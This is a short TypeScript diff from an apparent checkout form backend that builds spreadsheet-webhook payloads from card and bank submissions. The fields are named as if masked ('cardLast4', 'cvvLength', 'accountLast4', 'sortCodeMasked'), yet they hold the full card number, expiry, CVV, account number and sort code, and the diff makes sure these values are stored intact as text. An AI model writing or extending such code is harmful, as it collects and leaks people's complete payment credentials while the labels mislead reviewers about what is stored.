@@ -83,26 +83,31 @@ function getTargetWebhook(formType: CheckoutPayload["formType"]): string | undef
   );
 }
 
+function asSheetText(value: string): string {
+  const trimmed = value.trim();
+  return trimmed ? `'${trimmed}` : "";
+}
+
 function toSecureSheetPayload(payload: SecurePaymentPayload) {
   return {
-    submittedAt: `'${formatPakistanDateTime(new Date())}`,
+    submittedAt: asSheetText(formatPakistanDateTime(new Date())),
     formType: payload.formType,
     nameOnCard: payload.nameOnCard.trim(),
-    cardLast4: payload.cardNumber,
-    expiryMonth: payload.expMonth,
-    expiryYear: payload.expYear,
-    cvvLength: payload.cvv
+    cardLast4: asSheetText(payload.cardNumber),
+    expiryMonth: asSheetText(payload.expMonth),
+    expiryYear: asSheetText(payload.expYear),
+    cvvLength: asSheetText(payload.cvv),
   };
 }
 
 function toBankSheetPayload(payload: BankDetailsPayload) {
   return {
-    submittedAt: `'${formatPakistanDateTime(new Date())}`,
+    submittedAt: asSheetText(formatPakistanDateTime(new Date())),
     formType: payload.formType,
     bankName: payload.bankName.trim(),
     nameWithBank: payload.nameWithBank.trim(),
-    accountLast4: payload.bankAccountNumber,
-    sortCodeMasked:payload.sortCode
+    accountLast4: asSheetText(payload.bankAccountNumber),
+    sortCodeMasked: asSheetText(payload.sortCode),
   };
 }
 
